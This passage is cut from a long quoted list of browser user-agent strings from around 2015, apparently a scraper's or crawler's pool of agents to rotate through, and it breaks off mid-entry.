(Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/7.1.4 Safari/537.85.13', 'Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.0.0 Safari/538.1', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko', 'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12F69 Safari/600.1.4', 'Mozilla/5.0 (Android; Tablet; rv:40.0) Gecko/40.0 Firefox/40.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/536.30.1 (KHTML, like Gecko) Version/6.0.5 Safari/536.30.1', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.13.US Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MAAU; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 7_0_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A501 Safari/9537.53', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53', 'Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12F69 Safari/600.1.4', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MASMJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; FunWebProducts; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUS; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T230NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE10;ENUSWOL; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 5.1; rv:39.0) Gecko/20100101 Firefox/39.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:39.0) Gecko/20100101 Firefox/39.0', 'Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWA Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174', 'Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie9; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 5.0.2; SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 9_0 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13A4325c Safari/601.1', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0)', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H321 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36', 'Mozilla/5.0 (PlayStation 4 2.57) AppleWebKit/537.73 (KHTML, like Gecko)', 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0', 'Mozilla/5.0 (Linux; Android 5.0; SM-G900V Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)', 'Mozilla/5.0 (Linux; Android 5.0.2; SM-T800 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:39.0) Gecko/20100101 Firefox/39.0', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; TNJB; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; ASJB; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE10;ENUSMSN; rv:11.0) like Gecko', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MATBJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MASAJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; rv:41.0) Gecko/20100101 Firefox/41.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MALC; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MDDCJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:39.0) Gecko/20100101 Firefox/39.0', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie10; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G900A Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4.0.3; en-gb; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/8.0)', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko', 'Mozilla/5.0 (X11; CrOS x86_64 7077.111.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; rv:37.0) Gecko/20100101 Firefox/37.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.18.US Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; GWX:QUALIFIED)', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.13.US Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:23.0) Gecko/20100101 Firefox/23.0', 'Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/44.0.2403.89 Chrome/44.0.2403.89 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A523 Safari/8536.25', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MANM; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12H143 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MDDRJS)', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MATBJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.13.US Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (X11; Linux x86_64; U; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (X11; CrOS x86_64 6946.86.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; MDDRJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12F69 Safari/600.1.4', 'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; GIL 3.5; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:41.0) Gecko/20100101 Firefox/41.0', 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.1 Safari/534.34', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; USPortal; rv:11.0) like Gecko', 'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H143', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (iPad; CPU OS 6_1_2 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B146 Safari/8536.25', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36', 'Mozilla/5.0 (MSIE 9.0; Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0', 'Mozilla/5.0 (X11; FC Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0', 'Mozilla/5.0 (X11; CrOS armv7l 7262.52.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.86 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MASAJS; rv:11.0) like Gecko', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; yie11; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10532', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSMSE; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; InfoPath.3)', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T320 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H143 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 